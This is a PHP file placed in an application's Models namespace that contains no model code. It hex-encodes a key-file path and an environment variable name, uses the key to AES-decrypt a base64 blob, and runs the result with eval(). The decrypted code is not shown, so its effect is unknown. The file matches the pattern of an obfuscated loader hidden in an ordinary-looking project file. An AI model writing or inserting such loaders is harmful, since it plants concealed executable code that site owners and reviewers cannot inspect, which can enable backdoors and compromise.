<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZjYtAyBWg6Og07HP/qIOSg==');

$c=base64_decode(

'vH71Cu8M7dkRHWqcdO09tEOInCAxNTNjcUlMe/+FZ9Q9U3tGPWnxZiaXyZ6lVMM+zF6L2O0E9P7S' .
'PqscJBWMvBnivoWdgnbhZeVjhZhGXGGXeyRRBbcoD1ByHQRWbkZGFSZstYWlCcnRw8jBymRwEFKS' .
'XVpHrCK0isDgMmPbqVbOMVRF8GVjZhVNC1BuHAqBJgyUM2AWKYpchpd76fQt5wuS/PkN7dqYNtI3' .
'PrcO9QgVXPfTqBPx0HckP6X00/fhVFrK/gdrbsqe9fMeX9HlItveIB6cX77nCZl6ud82qfBoMw7a' .
'SsAbtnqSFfc8iI+7M4MlUR3tR39qmrPD+hcK92Z1yvGSf858FOoztZ69arlv5I7nDV7Mv3o1FmZN' .
'+bO68Spw3xT7tWbJdpZ1sE0GguWwW/d3Qb/Y01TN9Z5ml/PBL1ybpS5mztfXh4BkpsSaMnp62Pgw' .
'iSY5vgDgE3vtZh/E4AVDhkHRRmcntH4/OLzb6XhS15tVBvtaTaoIWWGYSbRAMFZJ/9sbE82tOhpJ' .
'L4s8ENddtamVwGeS1JGLNrTaCAygDJJrfneShsldH8ykE8mrGbq61JXyvG3EJDrPk8KJMALJ1jTB' .
'/+mXdCH4o8vznkcZ5IhYFZOBSqicaCITALYLEyvxfGvPvZgvwKzZqhGyNaIO+yIAO27xNSt4yoYj' .
'Fy+JHxseK+MAti2rtQToOjm0zjTKhPAYneqbqONDFIOXxw9umE5+mngYuoU076puzAlRiLgreMjT' .
'FDL9a08425uJC8Dou3uQK8VeaiOaajtppJuvC9E6VAVrZYeL93qWOWl2iXBlHgclasKH+zYoSOlI' .
'2gMMwtII3CUTQ3/LcafhB0gx7TobAicyzU7NvdWqXPFf7FK1Hzs/TWZ2QxA4'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

